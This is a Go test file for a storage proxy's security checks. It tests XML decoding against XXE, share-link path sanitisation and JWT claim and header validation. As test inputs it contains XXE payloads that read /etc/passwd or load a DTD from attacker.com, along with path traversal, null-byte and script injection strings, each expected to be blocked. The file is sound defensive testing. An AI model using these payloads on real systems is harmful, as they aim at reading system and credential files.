package proxy

import (
	"bytes"
	"encoding/xml"
	"testing"
	"time"

	"github.com/einyx/foundation-storage-engine/internal/config"
	"github.com/einyx/foundation-storage-engine/pkg/s3"
)

func TestXXEProtection(t *testing.T) {
	// Test secure XML decoding to prevent XXE attacks

	tests := []struct {
		name        string
		xmlPayload  string
		expectError bool
		desc        string
	}{
		{
			name: "legitimate_delete_request",
			xmlPayload: `<?xml version="1.0" encoding="UTF-8"?>
<Delete>
    <Object>
        <Key>test-file.txt</Key>
    </Object>
</Delete>`,
			expectError: false,
			desc:        "Normal delete request should work",
		},
		{
			name: "xxe_attack_attempt",
			xmlPayload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Delete [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<Delete>
    <Object>
        <Key>&xxe;</Key>
    </Object>
</Delete>`,
			expectError: true,
			desc:        "XXE attack should be blocked",
		},
		{
			name: "external_dtd_attack",
			xmlPayload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Delete SYSTEM "http://attacker.com/evil.dtd">
<Delete>
    <Object>
        <Key>test</Key>
    </Object>
</Delete>`,
			expectError: true,
			desc:        "External DTD attack should be blocked",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Create secure XML decoder with XXE protection
			decoder := xml.NewDecoder(bytes.NewReader([]byte(tt.xmlPayload)))
			decoder.Strict = false
			// Disable external entity resolution to prevent XXE attacks
			decoder.Entity = map[string]string{}

			var req s3.DeleteObjectsRequest
			err := decoder.Decode(&req)

			if tt.expectError {
				// For XXE attacks, Go's XML parser with empty Entity map prevents external entity resolution
				// Entities either cause parse errors or remain as literal text (not resolved to external content)
				if err == nil {
					// Check if the entity was resolved to empty (blocked) or left as literal
					if len(req.Objects) > 0 && (len(req.Objects[0].Key) == 0 || req.Objects[0].Key == "&xxe;" || req.Objects[0].Key == "test") {
						// Entity was blocked, left as literal, or DTD was ignored (key remains "test")
						// For external DTD, the key "test" means the external DTD was not loaded
						return
					}
					var key string
					if len(req.Objects) > 0 {
						key = req.Objects[0].Key
					}
					t.Errorf("Expected XXE protection (error or blocked entity) but entity was resolved: %s (key: %q)", tt.desc, key)
				}
				// Parse error is also acceptable for XXE protection
			} else if err != nil {
				t.Errorf("Unexpected error for legitimate request: %v (%s)", err, tt.desc)
			}
		})
	}
}

func TestShareLinkPathTraversal(t *testing.T) {
	handler := &ShareLinkHandler{}

	tests := []struct {
		name     string
		input    string
		expected string
		desc     string
	}{
		{
			name:     "normal_path",
			input:    "my-bucket/files/document.pdf",
			expected: "my-bucket/files/document.pdf",
			desc:     "Normal path should be preserved",
		},
		{
			name:     "path_traversal_attempt",
			input:    "../../../etc/passwd",
			expected: "",
			desc:     "Path traversal should be rejected",
		},
		{
			name:     "encoded_traversal",
			input:    "..%2F..%2F..%2Fetc%2Fpasswd",
			expected: "",
			desc:     "URL encoded traversal should be rejected",
		},
		{
			name:     "null_byte_injection",
			input:    "normal-file.txt\x00../../etc/passwd",
			expected: "",
			desc:     "Null byte injection should be rejected",
		},
		{
			name:     "backslash_traversal",
			input:    "..\\..\\..\\windows\\system32\\config\\sam",
			expected: "",
			desc:     "Backslash traversal should be rejected",
		},
		{
			name:     "absolute_path",
			input:    "/etc/passwd",
			expected: "",
			desc:     "Absolute paths should be rejected",
		},
		{
			name:     "double_slash",
			input:    "bucket//file",
			expected: "",
			desc:     "Double slashes should be rejected",
		},
		{
			name:     "special_characters",
			input:    "bucket/file<script>alert(1)</script>",
			expected: "",
			desc:     "Special characters should be rejected",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := handler.sanitizePath(tt.input)
			if result != tt.expected {
				t.Errorf("sanitizePath(%q) = %q, expected %q: %s", tt.input, result, tt.expected, tt.desc)
			}
		})
	}
}

func TestJWTClaimsValidation(t *testing.T) {
	handler := &Auth0Handler{
		config: &config.Auth0Config{
			Domain:   "test-domain.auth0.com",
			ClientID: "test-client-id",
		},
	}

	validTime := time.Now().Add(1 * time.Hour).Unix()
	expiredTime := time.Now().Add(-1 * time.Hour).Unix()
	futureTime := time.Now().Add(10 * time.Minute).Unix()

	tests := []struct {
		name     string
		claims   map[string]interface{}
		expected bool
		desc     string
	}{
		{
			name: "valid_claims",
			claims: map[string]interface{}{
				"iss": "https://test-domain.auth0.com/",
				"aud": "test-client-id",
				"exp": float64(validTime),
				"iat": float64(time.Now().Unix()),
			},
			expected: true,
			desc:     "Valid JWT claims should pass validation",
		},
		{
			name: "invalid_issuer",
			claims: map[string]interface{}{
				"iss": "https://malicious-domain.com/",
				"aud": "test-client-id",
				"exp": float64(validTime),
				"iat": float64(time.Now().Unix()),
			},
			expected: false,
			desc:     "Invalid issuer should be rejected",
		},
		{
			name: "invalid_audience",
			claims: map[string]interface{}{
				"iss": "https://test-domain.auth0.com/",
				"aud": "malicious-client-id",
				"exp": float64(validTime),
				"iat": float64(time.Now().Unix()),
			},
			expected: false,
			desc:     "Invalid audience should be rejected",
		},
		{
			name: "expired_token",
			claims: map[string]interface{}{
				"iss": "https://test-domain.auth0.com/",
				"aud": "test-client-id",
				"exp": float64(expiredTime),
				"iat": float64(time.Now().Unix()),
			},
			expected: false,
			desc:     "Expired token should be rejected",
		},
		{
			name: "missing_expiration",
			claims: map[string]interface{}{
				"iss": "https://test-domain.auth0.com/",
				"aud": "test-client-id",
				"iat": float64(time.Now().Unix()),
			},
			expected: false,
			desc:     "Missing expiration should be rejected",
		},
		{
			name: "future_issued_token",
			claims: map[string]interface{}{
				"iss": "https://test-domain.auth0.com/",
				"aud": "test-client-id",
				"exp": float64(validTime),
				"iat": float64(futureTime),
			},
			expected: false,
			desc:     "Token issued in future should be rejected",
		},
		{
			name: "not_yet_valid_token",
			claims: map[string]interface{}{
				"iss": "https://test-domain.auth0.com/",
				"aud": "test-client-id",
				"exp": float64(validTime),
				"iat": float64(time.Now().Unix()),
				"nbf": float64(futureTime),
			},
			expected: false,
			desc:     "Token not yet valid should be rejected",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := handler.validateJWTClaims(tt.claims)
			if tt.expected && err != nil {
				t.Errorf("Expected valid claims but got error: %v (%s)", err, tt.desc)
			}
			if !tt.expected && err == nil {
				t.Errorf("Expected error for invalid claims but got none: %s", tt.desc)
			}
		})
	}
}

func TestJWTHeaderValidation(t *testing.T) {
	handler := &Auth0Handler{}

	tests := []struct {
		name     string
		token    string
		expected bool
		desc     string
	}{
		{
			name:     "invalid_format",
			token:    "invalid.jwt",
			expected: false,
			desc:     "Invalid JWT format should be rejected",
		},
		{
			name:     "valid_rs256_header",
			token:    "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InRlc3Qta2V5LWlkIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.signature",
			expected: true,
			desc:     "Valid RS256 header should pass basic validation",
		},
		{
			name:     "unsupported_algorithm",
			token:    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.signature",
			expected: false,
			desc:     "Unsupported algorithm should be rejected",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := handler.verifyJWTSignature(tt.token)
			if tt.expected && err != nil {
				t.Errorf("Expected valid JWT header but got error: %v (%s)", err, tt.desc)
			}
			if !tt.expected && err == nil {
				t.Errorf("Expected error for invalid JWT header but got none: %s", tt.desc)
			}
		})
	}
}